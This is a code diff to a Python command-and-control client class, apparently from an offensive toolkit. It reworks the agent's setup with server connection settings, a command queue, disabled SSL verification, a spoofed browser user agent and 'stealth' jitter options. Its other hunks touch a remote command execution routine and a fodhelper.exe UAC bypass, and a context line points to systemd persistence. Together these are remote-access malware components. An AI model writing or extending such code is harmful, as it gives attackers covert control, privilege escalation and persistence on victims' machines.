@@ -49,47 +49,52 @@ class C2Client(BaseC2):
     """
 
     def __init__(self, config: Dict[str, Any]):
-        super().__init__()
-        self.logger = logging.getLogger("IntellicrackLogger.C2Client")
+        """Initialize the C2 client agent."""
         self.config = config
+        self.logger = logging.getLogger("IntellicrackLogger.C2Client")
+        
+        # Client configuration
+        self.server_host = config.get('server_host', 'localhost')
+        self.server_port = config.get('server_port', 8080)
+        self.protocol = config.get('protocol', 'https')
+        self.encryption_key = config.get('encryption_key')
+        self.client_id = config.get('client_id', self._generate_client_id())
+        
+        # Connection management
+        self.connection = None
+        self.connected = False
+        self.last_heartbeat = 0
+        self.heartbeat_interval = config.get('heartbeat_interval', 30)  # seconds
+        self.reconnect_attempts = 0
+        self.max_reconnect_attempts = config.get('max_reconnect_attempts', 5)
+        
+        # Command execution
+        self.command_queue = queue.Queue()
+        self.result_queue = queue.Queue()
         self.running = False
-        self.session_id = None
-
-        # Core components
-        self.encryption_manager = EncryptionManager()
-
-        # Protocol handlers (ordered by preference)
-        self.protocols = []
-        self._initialize_protocols()
-
-        # Communication state
-        self.current_protocol = None
-        self.beacon_interval = config.get('beacon_interval', 60)  # seconds
-        self.jitter_percent = config.get('jitter_percent', 20)
-        self.max_retries = config.get('max_retries', 3)
-        self.retry_delay = config.get('retry_delay', 30)
-
-        # Task management
-        self.pending_tasks = []
-        self.completed_tasks = []
-        self.task_results = {}
-
-        # Autonomous capabilities
-        self.auto_gather_info = config.get('auto_gather_info', True)
-        self.auto_screenshot = config.get('auto_screenshot', False)
-        self.auto_keylog = config.get('auto_keylog', False)
-
+        self.worker_thread = None
+        
+        # Security features
+        self.use_encryption = config.get('use_encryption', True)
+        self.verify_ssl = config.get('verify_ssl', False)
+        self.user_agent = config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+        
+        # Stealth features
+        self.jitter_enabled = config.get('jitter_enabled', True)
+        self.sleep_time = config.get('sleep_time', 1.0)
+        self.max_jitter = config.get('max_jitter', 0.3)
+        
         # Statistics
-        self.stats = {
-            'start_time': None,
-            'last_checkin': None,
-            'total_tasks': 0,
-            'successful_tasks': 0,
-            'failed_tasks': 0,
-            'protocol_failures': 0,
-            'bytes_sent': 0,
-            'bytes_received': 0
-        }
+        self.commands_executed = 0
+        self.bytes_sent = 0
+        self.bytes_received = 0
+        self.session_start_time = time.time()
+        
+        # Initialize encryption if enabled
+        if self.use_encryption and self.encryption_key:
+            self._setup_encryption()
+        
+        self.logger.info(f"C2 client initialized for {self.server_host}:{self.server_port}")
 
     def _initialize_protocols(self):
         """Initialize communication protocols in order of preference."""
@@ -438,7 +443,7 @@ class C2Client(BaseC2):
                 cmd_args = shlex.split(command)
             else:
                 cmd_args = command
-            
+
             result = subprocess.run(
                 cmd_args,
                 shell=False,
@@ -449,7 +454,7 @@ class C2Client(BaseC2):
             return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
         except ImportError as e:
             self.logger.error("Import error in c2_client.py: %s", e)
-            return f"Command execution failed: shlex import error"
+            return "Command execution failed: shlex import error"
         except subprocess.TimeoutExpired as e:
             self.logger.error("subprocess.TimeoutExpired in c2_client.py: %s", e)
             return "Command timed out after 30 seconds"
@@ -1322,9 +1327,9 @@ WantedBy=multi-user.target
 
             # Execute fodhelper.exe to trigger UAC bypass
             # Use subprocess without shell=True for security
-            result = subprocess.run(['fodhelper.exe'], 
-                                   capture_output=True, 
-                                   text=True, 
+            result = subprocess.run(['fodhelper.exe'],
+                                   capture_output=True,
+                                   text=True,
                                    shell=False,
                                    timeout=5)
 
